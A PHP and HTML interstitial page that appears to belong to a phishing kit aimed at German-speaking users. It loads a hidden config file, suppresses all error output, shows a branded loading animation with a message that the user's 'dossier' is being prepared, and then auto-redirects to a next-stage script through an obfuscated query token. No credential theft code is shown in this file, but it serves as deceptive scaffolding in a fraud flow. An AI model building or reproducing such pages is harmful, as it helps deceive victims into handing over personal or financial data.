<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

include("./Config/911.php");

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="refresh" content="7; URL= ./B.php?JQSUSHSJSKXSK=1KJSDKJhjghtyuUJSUSQUIQSIklklsisiiIUZIUZEJQSJkkjsJSJS">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="./X911/helpers.css">
  <title>Loading...</title>            
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
</head>
<style>
    .lds-ellipsis {
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;
}
.lds-ellipsis div {
  position: absolute;
  top: 33px;
  width: 13px;
  height: 13px;
  border-radius: 50%;
  background: #fe0000;
  animation-timing-function: cubic-bezier(0, 1, 1, 0);
}
.lds-ellipsis div:nth-child(1) {
  left: 8px;
  animation: lds-ellipsis1 0.6s infinite;
}
.lds-ellipsis div:nth-child(2) {
  left: 8px;
  animation: lds-ellipsis2 0.6s infinite;
}
.lds-ellipsis div:nth-child(3) {
  left: 32px;
  animation: lds-ellipsis2 0.6s infinite;
}
.lds-ellipsis div:nth-child(4) {
  left: 56px;
  animation: lds-ellipsis3 0.6s infinite;
}
@keyframes lds-ellipsis1 {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}
@keyframes lds-ellipsis3 {
  0% {
    transform: scale(1);
  }
  100% {
    transform: scale(0);
  }
}
@keyframes lds-ellipsis2 {
  0% {
    transform: translate(0, 0);
  }
  100% {
    transform: translate(24px, 0);
  }
}
:root {
  --loader-width: 150px;
  --loader-dot-size: 20px;
}

.container {
  font-family: Helvetica;
}

.loader {
  height: var(--loader-dot-size);
  width: var(--loader-width);
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
  margin: auto;
  display: flex;
  justify-content: space-between;
  position: relative;
}

.loader--dot {
  animation: loader 3s ease-in-out infinite;
  height: var(--loader-dot-size);
  width: var(--loader-dot-size);
  border-radius: 50%;
  background-color: black;
  position: absolute;
  border: 2px solid #F5F5F5;
}

.loader--dot:nth-child(1) {
  background-color: #fe0000;
  animation-delay: 0.5s;
}

.loader--dot:nth-child(2) {
  background-color: #fe0000;
  animation-delay: 0.4s;
}

.loader--dot:nth-child(3) {
  background-color: #fe0000;
  animation-delay: 0.3s;
}

.loader--dot:nth-child(4) {
  background-color: #fe0000;
  animation-delay: 0.2s;
}

.loader--dot:nth-child(5) {
  background-color: #fe0000;
  animation-delay: 0.1s;
}

.loader--dot:nth-child(6) {
  background-color: #fe0000;
  animation-delay: 0s;
}

.loader--text {
  position: absolute;
  top: 200%;
  left: 0;
  right: 0;
  width: 4rem;
  margin: auto;
  text-align: center;
  font-weight: bold;
}

.loader--text::after {
  content: "Loading";
  animation: loading-text 3s infinite;
}

@keyframes loader {
  15% {
    transform: translateX(0);
  }
  45% {
    transform: translateX(calc(var(--loader-width) - var(--loader-dot-size)));
  }
  65% {
    transform: translateX(calc(var(--loader-width) - var(--loader-dot-size)));
  }
  95% {
    transform: translateX(0);
  }
}
</style>
<body>
    <section id="login" style="height: 100vh;">
        <div class="loading text-center" style="padding-top: 200px;">
            <div class="logo"><img style="border-radius: 15px; width: 120px;" src="./X911/512x512bb.jpg"></div>
			<br>
            <div class="container">
              <div class="loader">
                <div class="loader--dot"></div>
                <div class="loader--dot"></div>
                <div class="loader--dot"></div>
                <div class="loader--dot"></div>
                <div class="loader--dot"></div>
                <div class="loader--dot"></div>
              </div>
            </div>
            <p style="padding: 10px;">Die Vorbereitung Ihres Dossiers läuft, bitte haben Sie Geduld und verlassen Sie diese Seite nicht.</p>
        </div>
    </section>
</body>
</html>